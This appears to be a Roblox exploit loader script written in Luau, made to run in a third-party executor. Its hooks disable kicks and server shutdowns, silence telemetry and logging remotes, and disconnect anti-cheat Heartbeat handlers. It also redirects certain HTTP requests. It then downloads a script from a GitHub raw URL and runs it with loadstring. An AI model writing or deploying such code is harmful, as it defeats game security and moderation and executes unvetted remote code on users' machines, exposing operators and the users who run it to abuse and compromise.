local url = "https://raw.githubusercontent.com/Religius-Star/Main/refs/heads/main/Script/Game0/b66.luau"
local Players = game:GetService("Players")
local LP = Players.LocalPlayer
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local oldHttpGet
if hookfunction then
    oldHttpGet = hookfunction(game.HttpGet, function(self, reqUrl, ...)
        if type(reqUrl) == "string" and reqUrl:find("Mainery-foxxie") then
            return oldHttpGet(self, "https://www.roblox.com/asset/?id=1", ...)
        end
        return oldHttpGet(self, reqUrl, ...)
    end)
    
    local oldKick
    oldKick = hookfunction(LP.Kick, function(self, msg)
        if self == LP then return end
        return oldKick(self, msg)
    end)
    
    local oldShutdown
    oldShutdown = hookfunction(game.Shutdown, function(self, ...)
        if self == game then return end
        return oldShutdown(self, ...)
    end)
end

for _, v in ipairs(ReplicatedStorage:GetDescendants()) do
    if v:IsA("RemoteEvent") then
        local n = v.Name:lower()
        if n:match("telemetry") or n:match("log") or n:match("sync") or n:match("notice") or n:match("shutdown") then
            if hookfunction then
                pcall(function()
                    hookfunction(v.FireServer, function() return end)
                    v.OnClientEvent:Connect(function() end)
                end)
            end
        end
    end
end

if getconnections then
    pcall(function()
        for _, conn in ipairs(getconnections(RunService.Heartbeat)) do
            local func = conn.Function
            if func and isfunction(func) then
                local info = debug.info(func, "s")
                if info and (info:lower():find("anti") or info:lower():find("guard") or info:lower():find("detect")) then
                    conn:Disconnect()
                end
            end
        end
    end)
end

local success, response = pcall(function()
    return game:HttpGet(url)
end)

if not success or not response then return end

local func = loadstring(response)
if func then
    task.spawn(func)
end
